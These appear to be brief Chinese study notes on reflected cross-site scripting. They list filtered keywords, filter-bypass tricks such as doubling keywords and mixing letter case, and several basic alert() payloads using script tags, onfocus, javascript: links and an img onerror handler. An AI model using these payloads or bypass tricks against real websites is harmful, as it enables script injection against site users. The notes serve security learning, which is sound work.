# 被过滤

```
script 
data
on
data

```



# 绕过技巧

```
双写
大小写
看view：source   ，闭合标签
```



# 反射型xss

最基本的

```
<script>alert(1)</script>
```



```
input等标签
onfocus=javascript:alert(1)' 
```



```
"> <a href=javascript:alert()> "<
```

```
当src错误时，就会报错
<img src=111 onerror=alert('xss')>
```



# 
